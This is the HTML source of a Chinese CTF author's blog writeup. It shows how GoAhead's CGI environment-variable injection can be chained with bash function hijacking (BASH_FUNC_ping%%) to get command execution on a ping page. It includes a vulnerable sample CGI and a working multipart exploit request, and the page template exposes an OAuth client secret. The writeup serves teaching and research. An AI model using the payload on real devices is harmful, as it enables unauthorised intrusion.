@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<meta name="referrer" content="never">
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-CNTF3L2LQC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CNTF3L2LQC');
+</script>  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?a2d27f70a2f1f5f5edfb5884096627ae";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script> 
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+    
+    <title>
+      ping2rce出题人writeup 一种环境变量注入劫持bash的实际利用场景 - 白帽酱の博客
+    </title>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    
+<link rel="stylesheet" href="/style/style.css">
+
+  <meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="白帽酱の博客" type="application/atom+xml">
+</head>
+  <body>
+    <canvas id='pagemap'></canvas>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GoAhead"><span class="toc-text">GoAhead</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GoAhead-bash"><span class="toc-text">GoAhead + bash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search" />
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg" />
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class="">
+          首页
+        </a>
+        
+        <a href="/archives" class="">
+          归档
+        </a>
+        
+        <a href="/categories" class="">
+          分类
+        </a>
+        
+        <a href="/tags" class="">
+          标签
+        </a>
+        
+        <a href="/friends" class="">
+          友链
+        </a>
+        
+        <a href="/about" class="">
+          关于
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">白帽酱</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">白帽酱</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class="">
+            首页
+          </a>
+          
+          <a href="/archives" class="">
+            归档
+          </a>
+          
+          <a href="/categories" class="">
+            分类
+          </a>
+          
+          <a href="/tags" class="">
+            标签
+          </a>
+          
+          <a href="/friends" class="">
+            友链
+          </a>
+          
+          <a href="/about" class="">
+            关于
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/burpheart" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://twitter.com/burp_heart" target="_block">
+              <span class="iconfont icon-twitter"></span>
+            </a>
+            
+            <a href="https://space.bilibili.com/32890488" target="_block">
+              <span class="iconfont icon-bilibili"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">ping2rce出题人writeup 一种环境变量注入劫持bash的实际利用场景</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2022/05/25</span>
+        </span>
+
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/WEB">WEB</a>
+                
+              
+                
+                  <a href="/categories/writeup">writeup</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/writeup">writeup</a>
+                  
+                
+                  
+                    <a href="/tags/WEB">WEB</a>
+                  
+                
+                  
+                    <a href="/tags/goahead">goahead</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <html><head></head><body><h1 id="前言">前言<a class="post-anchor" href="#前言"></a></h1><p>前不久p牛分享了一个<a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/">利用环境变量注入劫持bash</a>的技巧.<br>当时我就在想这种环境变量的注入有没有什么比较通用的场景。一般遇到的环境变量注入基本上都是直接使用ld_preload解决问题。p牛的这种新的环境变量注入的利用技巧，有没有什么特殊的利用面呢。</p>
+<h1 id="GoAhead">GoAhead<a class="post-anchor" href="#GoAhead"></a></h1><p>   嵌入式设备常用的Web服务器 GoAhead 出现过环境变量注入漏洞 CVE-2017-17562 和 CVE-2021-42342。<br>漏洞的原理很简单：服务器会把收到的CGI请求参数直接写入到环境变量中。</p>
+<p>CVE-2017-17562 的修复方案也很简单：在写入的环境变量前加 CGI_前缀 添加黑名单过滤（实际上无效）。<br>但是这补丁并没有完全修复。<br>在 multipart 表单请求遗漏了请求参数的处理  黑名单也没起作用 所以就有了CVE-2021-42342<br>当时我在复现 CVE-2017-17562和CVE-2021-42342 时遇到了一个问题.<br>我在上传文件时发生了500错误  控制台无任何错误输出  阅读源码后我发现<br>GoAhead 上传文件时会向一个固定的临时文件夹写入临时文件  默认为–home参数提供的目录下的tmp目录<br>如果目录不存在 或者是无法写入文件，就无法完成上传流程。（在后来搜索漏洞分析的才发现了<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">p牛的文章</a>已经写过了我遇到的坑 还有一些其他的玄学问题）<br>在创建tmp目录后，我成功的完成了漏洞复现。<br><strong>这时我想到了一个问题：</strong><br> 嵌入式设备大多都是只读文件系统，即使是可写也没有创建这个临时目录。<br>那么，这个漏洞在实际的场景下应该很难利用。<br>当时没有其他方法只能止步于此。  直到我遇到了p牛的这篇文章。</p>
+<h1 id="GoAhead-bash">GoAhead + bash<a class="post-anchor" href="#GoAhead-bash"></a></h1><p>一些嵌入式设备会有执行系统命令的场景。<br>比如ping 路由跟踪 等等。<br>在这个场景下并结合p牛的bash劫持，就可以完美的完成命令执行目标。<br>随便构建一个cgi</p>
+<figure class="highlight c"><table><tbody><tr><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">isValidIp4</span> <span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>{<br>    <span class="hljs-keyword">int</span> segs = <span class="hljs-number">0</span>;   <span class="hljs-comment">/* Segment count. */</span><br>    <span class="hljs-keyword">int</span> chcnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* Character count within segment. */</span><br>    <span class="hljs-keyword">int</span> accum = <span class="hljs-number">0</span>;  <span class="hljs-comment">/* Accumulator for segment. */</span><br><br>    <span class="hljs-comment">/* Catch NULL pointer. */</span><br><br>    <span class="hljs-keyword">if</span> (str == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Process every character in string. */</span><br><br>    <span class="hljs-keyword">while</span> (*str != <span class="hljs-string">'\0'</span>) {<br>        <span class="hljs-comment">/* Segment changeover. */</span><br><br>        <span class="hljs-keyword">if</span> (*str == <span class="hljs-string">'.'</span>) {<br>            <span class="hljs-comment">/* Must have some digits in segment. */</span><br><br>            <span class="hljs-keyword">if</span> (chcnt == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-comment">/* Limit number of segments. */</span><br><br>            <span class="hljs-keyword">if</span> (++segs == <span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>            <span class="hljs-comment">/* Reset segment values and restart loop. */</span><br><br>            chcnt = accum = <span class="hljs-number">0</span>;<br>            str++;<br>            <span class="hljs-keyword">continue</span>;<br>        }<br>        <span class="hljs-comment">/* Check numeric. */</span><br><br>        <span class="hljs-keyword">if</span> ((*str &lt; <span class="hljs-string">'0'</span>) || (*str &gt; <span class="hljs-string">'9'</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Accumulate and check segment. */</span><br><br>        <span class="hljs-keyword">if</span> ((accum = accum * <span class="hljs-number">10</span> + *str - <span class="hljs-string">'0'</span>) &gt; <span class="hljs-number">255</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">/* Advance other segment specific stuff and continue loop. */</span><br><br>        chcnt++;<br>        str++;<br>    }<br><br>    <span class="hljs-comment">/* Check enough segments and enough characters in last segment. */</span><br><br>    <span class="hljs-keyword">if</span> (segs != <span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (chcnt == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Address okay. */</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>}<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;HTML&gt;&lt;TITLE&gt;Network looking glass&lt;/TITLE&gt;&lt;BODY&gt;\r\n"</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;form action=\"\" method=\"GET\"&gt;\r\n"</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;input name=\"ip\"&gt;\r\n"</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;input type=\"submit\" value=\"ping\"&gt;\r\n"</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;/form&gt;\r\n"</span>);<br>fflush(<span class="hljs-built_in">stdout</span>);<br><span class="hljs-keyword">if</span> (numQueryKeys != <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;H2&gt;result&lt;/H2&gt;\r\n"</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; (numQueryKeys * <span class="hljs-number">2</span>); i += <span class="hljs-number">2</span>) {<br>        <span class="hljs-keyword">if</span> (queryKeys[i+<span class="hljs-number">1</span>] != <span class="hljs-number">0</span>) {<br>            <span class="hljs-keyword">if</span>(isValidIp4(queryKeys[i+<span class="hljs-number">1</span>])){ <br>                <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">256</span>];<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;p&gt;$ping -c 4 -w15 %s&lt;/p&gt;\r\n&lt;textarea  style=\"width: 484px; height: 165px;\"&gt;"</span>,queryKeys[i+<span class="hljs-number">1</span>]);<br>                fflush(<span class="hljs-built_in">stdout</span>);<br>                <span class="hljs-built_in">sprintf</span>(buffer, <span class="hljs-string">"ping -c 4 -w15 %s"</span>, queryKeys[i+<span class="hljs-number">1</span>]);<br>                system(buffer);<br>                fflush(<span class="hljs-built_in">stdout</span>);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;/textarea&gt;"</span>);<br>            }<span class="hljs-keyword">else</span>{<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;H2&gt;invalid ip&lt;/H2&gt;\r\n"</span>);<br>            }<br>        }<br>    }<br>}<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">"&lt;/BODY&gt;&lt;/HTML&gt;\r\n"</span>);<br></code></pre></td></tr></tbody></table></figure>
+
+<p>使用p牛的 bash环境变量注入劫持ping 命令实现任意代码执行<br>POST /cgi-bin/ping?fdhtf=1.1.1.1 HTTP/1.1<br>Host: 1.1.1.1<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Content-Type: multipart/form-data; boundary=—————————123456<br>Connection: close</p>
+<p>—————————–123456<br>Content-Disposition: form-data; name=”BASH_FUNC_ping%%”</p>
+<p>() { cat /flag; }<br>—————————–123456–<br><a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653484736586-9006357f-9832-4b3b-950d-35f178fc2014.png#clientId=uf161fa39-6704-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=257&amp;id=u4f24cf61&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=321&amp;originWidth=554&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=80172&amp;status=done&amp;style=none&amp;taskId=u3d575b19-1011-4f17-a7a3-1b2d924259a&amp;title=&amp;width=443.2" data-caption="图片.png" data-fancybox="images"><img src="https://cdn.nlark.com/yuque/0/2022/png/25577536/1653484736586-9006357f-9832-4b3b-950d-35f178fc2014.png#clientId=uf161fa39-6704-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=257&amp;id=u4f24cf61&amp;margin=%5Bobject%20Object%5D&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=321&amp;originWidth=554&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=80172&amp;status=done&amp;style=none&amp;taskId=u3d575b19-1011-4f17-a7a3-1b2d924259a&amp;title=&amp;width=443.2" alt="图片.png"></a></p>
+<h1 id="参考">参考<a class="post-anchor" href="#参考"></a></h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1450/">https://tttang.com/archive/1450/</a><br><a target="_blank" rel="noopener" href="https://www.potato.gold/article/79.html">https://www.potato.gold/article/79.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html</a></p>
+</body></html>
+
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2022/05/08/untitled-1652012374403/">CTFd性能优化笔记-DNUICTF</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="https://rce.moe">白帽酱</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="https://rce.moe/2022/05/25/ping2rce-writeup-goahead-environment-variable-inject-bash-hijack/">https://rce.moe/2022/05/25/ping2rce-writeup-goahead-environment-variable-inject-bash-hijack/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="https://rce.moe">白帽酱</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script type="text/javascript">
+    new Gitalk({
+        clientID: '1488ae49eda310270a91',
+        clientSecret: '83e505f36d0351b0ef1a225d089546cb40ecd31a',
+        repo: 'hexoblog',
+        owner: 'burpheart',
+        admin: 'burpheart',
+        id: md5(location.pathname),
+        distractionFreeMode: true
+    }).render('gitalk-container')
+</script>
+        <footer>
+          <div class="copyright">
+            ©2022
+            <a href="https://rce.moe">白帽酱</a> Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> |
+            <a target="_blank" rel="noopener" href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
